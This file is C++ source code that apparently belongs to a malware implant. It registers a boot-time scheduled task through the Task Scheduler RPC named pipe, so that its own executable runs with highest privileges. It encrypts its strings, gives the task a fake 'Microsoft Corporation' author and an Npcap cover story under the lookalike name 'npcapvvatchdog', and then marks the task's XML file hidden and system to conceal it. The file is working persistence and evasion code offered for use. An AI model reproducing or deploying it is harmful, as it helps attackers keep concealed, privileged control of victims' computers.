#include "atsvc.h"
#include "../Tools.h"

#pragma comment(lib, "rpcrt4.lib")



#define InterfaceAddress ENCRYPT_WSTR("\\pipe\\atsvc")
#define UUID ENCRYPT_WSTR("86D35949-83C9-4044-B424-DB363231FD0C")
#define TASK_CREATE 2

extern const MIDL_STUBLESS_PROXY_INFO ITaskSchedulerService_ProxyInfo;


void* __RPC_USER MIDL_user_allocate(size_t size) {
	return malloc(size);
}

void __RPC_USER MIDL_user_free(void* p) {
	free(p);
}

wchar_t* ConvertSidToWideStringSid(PSID sid)
{
	LPSTR strSid = NULL;
	if (!ConvertSidToStringSidA(sid, &strSid))	{
		return NULL;
	}

	int len = MultiByteToWideChar(CP_ACP, 0, strSid, -1, NULL, 0);
	if (len == 0)	{
		LocalFree(strSid);
		return NULL;
	}

	wchar_t* wSid = (wchar_t*)malloc(len * sizeof(wchar_t));
	if (!wSid)	{
		LocalFree(strSid);
		return NULL;
	}

	if (MultiByteToWideChar(CP_ACP, 0, strSid, -1, wSid, len) == 0)	{
		free(wSid);
		LocalFree(strSid);
		return NULL;
	}

	LocalFree(strSid);
	return wSid;  
}
wchar_t* BuildTaskXml(const wchar_t* commandPath)
{
	static wchar_t xmlBuffer[4096];

	char userName[256] = "";
	DWORD nameSize = sizeof(userName);
	GetUserNameA(userName, &nameSize);

	BYTE sid[256] = {};
	DWORD sidSize = sizeof(sid);
	char domain[256] = "";
	DWORD domainSize = sizeof(domain);
	SID_NAME_USE sidType;

	if (!LookupAccountNameA(NULL, userName, sid, &sidSize, domain, &domainSize, &sidType))
	{
		return NULL;
	}

	wchar_t* wideSid = ConvertSidToWideStringSid(sid);



	// 拼接 XML
	swprintf(xmlBuffer, 4096,
		ENCRYPT_WSTR("<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n"
		"<Task version=\"1.3\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n"
		"  <RegistrationInfo>\n"
		"    <Author>Microsoft Corporation</Author>\n"
		"    <Description>Ensure Npcap service is configured to start at boot</Description>\n"
		"    <URI>\\Microsoft Corporation</URI>\n"
		"  </RegistrationInfo>\n"
		"  <Triggers>\n"
		"    <BootTrigger>\n"
		"      <Enabled>true</Enabled>\n"
		"    </BootTrigger>\n"
		"  </Triggers>\n"
		"  <Settings>\n"
		"    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n"
		"    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n"
		"    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\n"
		"    <AllowHardTerminate>true</AllowHardTerminate>\n"
		"    <StartWhenAvailable>true</StartWhenAvailable>\n"
		"    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n"
		"    <IdleSettings>\n"
		"      <Duration>PT10M</Duration>\n"
		"      <WaitTimeout>PT1H</WaitTimeout>\n"
		"      <StopOnIdleEnd>false</StopOnIdleEnd>\n"
		"      <RestartOnIdle>false</RestartOnIdle>\n"
		"    </IdleSettings>\n"
		"    <AllowStartOnDemand>true</AllowStartOnDemand>\n"
		"    <Enabled>true</Enabled>\n"
		"    <Hidden>false</Hidden>\n"
		"    <RunOnlyIfIdle>false</RunOnlyIfIdle>\n"
		"    <WakeToRun>false</WakeToRun>\n"
		"    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>\n"
		"    <Priority>7</Priority>\n"
		"  </Settings>\n"
		"  <Actions Context=\"Author\">\n"
		"    <Exec>\n"
		"      <Command>%s</Command>\n"
		"    </Exec>\n"
		"  </Actions>\n"
		"  <Principals>\n"
		"    <Principal id=\"Author\">\n"
		"      <UserId>%s</UserId>\n"
		"      <LogonType>S4U</LogonType>\n"
		"      <RunLevel>HighestAvailable</RunLevel>\n"
		"    </Principal>\n"
		"  </Principals>\n"
		"</Task>\n"),
		commandPath, wideSid);

	return xmlBuffer;
}


RPC_BINDING_HANDLE BindtoRpc(){

	RPC_WSTR StringBinding;
	RPC_BINDING_HANDLE bindingHandle;
	RPC_SECURITY_QOS qos = { 0 };

	RpcStringBindingComposeW((RPC_WSTR)UUID, (RPC_WSTR)ENCRYPT_WSTR("ncacn_np"), (RPC_WSTR)ENCRYPT_WSTR("localhost"), (RPC_WSTR)InterfaceAddress, NULL, &StringBinding);

	RPC_STATUS status = RpcBindingFromStringBindingW(StringBinding, &bindingHandle);

	if (status != RPC_S_OK) {
		return NULL;
	}

	qos.Version = 1;
	qos.ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE;
	qos.Capabilities = RPC_C_QOS_CAPABILITIES_DEFAULT;
	qos.IdentityTracking = RPC_C_QOS_IDENTITY_STATIC;
	RpcBindingSetAuthInfoExW(bindingHandle, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
		RPC_C_AUTHN_WINNT, NULL, RPC_C_AUTHZ_NONE, &qos);

	RpcStringFreeW(&StringBinding);

	return bindingHandle;
}


VOID AddRemoteJob(RPC_BINDING_HANDLE handle,const wchar_t* cmd) {

	wchar_t* actualPath = NULL;
	TASK_XML_ERROR_INFO* errorInfo = NULL;



	wchar_t* xmlData = BuildTaskXml(cmd);

	
	NdrClientCall3((PMIDL_STUBLESS_PROXY_INFO) & ITaskSchedulerService_ProxyInfo, 1, NULL, handle, ENCRYPT_WSTR("\\npcapvvatchdog"), xmlData, TASK_CREATE, NULL, 0, 0, NULL, &actualPath, &errorInfo);
}

void HideXmlFile(std::wstring taskName)
{
	if (taskName.empty()) {
		return;
	}

	// 获取 %SystemRoot% 路径
	wchar_t systemRoot[MAX_PATH] = { 0 };
	if (!GetEnvironmentVariableW(ENCRYPT_WSTR("SystemRoot"), systemRoot, MAX_PATH)) {
		return;
	}

	std::wstring taskPath = std::wstring(systemRoot) + ENCRYPT_WSTR("\\System32\\Tasks\\") + taskName;

	DWORD currentAttributes = GetFileAttributesW(taskPath.c_str());
	if (currentAttributes == INVALID_FILE_ATTRIBUTES) {
		return;
	}

	// 设置 HIDDEN | SYSTEM 属性
	if ((currentAttributes & (FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)) != (FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)) {
		DWORD newAttributes = currentAttributes | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM;
		SetFileAttributesW(taskPath.c_str(), newAttributes);
		
	}
	
}

VOID addScheduleTask() {
	AddRemoteJob(BindtoRpc(), GetCurrentExecutablePath().c_str());
	HideXmlFile(ENCRYPT_WSTR("\\npcapvvatchdog"));
}




